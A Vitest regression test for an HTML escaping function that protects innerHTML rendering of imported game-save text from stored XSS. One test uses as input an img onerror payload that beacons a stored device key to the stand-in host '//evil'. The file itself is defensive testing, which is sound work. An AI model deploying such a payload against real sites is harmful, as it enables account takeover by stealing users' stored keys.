import { describe, expect, it } from 'vitest';
import { esc } from '../src/ui/esc';

// Regression guard for the stored-XSS fix: save-derived strings (chronicle
// text, friend/gift names, villager memories) are rendered into innerHTML, so
// a hostile imported save must not be able to smuggle executable markup.
describe('esc (XSS escaper for innerHTML sinks)', () => {
  it('neutralises the account-takeover payload', () => {
    const payload = `<img src=x onerror="navigator.sendBeacon('//evil', localStorage.getItem('hearth:device-key'))">`;
    const out = esc(payload);
    expect(out).not.toContain('<img');
    expect(out).not.toContain('<');
    expect(out).not.toContain('>');
    expect(out).toContain('&lt;img');
  });

  it('escapes every dangerous character', () => {
    expect(esc('&')).toBe('&amp;');
    expect(esc('<')).toBe('&lt;');
    expect(esc('>')).toBe('&gt;');
    expect(esc('"')).toBe('&quot;');
    expect(esc('a & b < c > d "e"')).toBe('a &amp; b &lt; c &gt; d &quot;e&quot;');
  });

  it('leaves benign player text (including apostrophes) intact', () => {
    expect(esc("Wren's good day by the harbour")).toBe("Wren's good day by the harbour");
    expect(esc('grateful for 3 < 5 sunny mornings')).toBe('grateful for 3 &lt; 5 sunny mornings');
  });
});
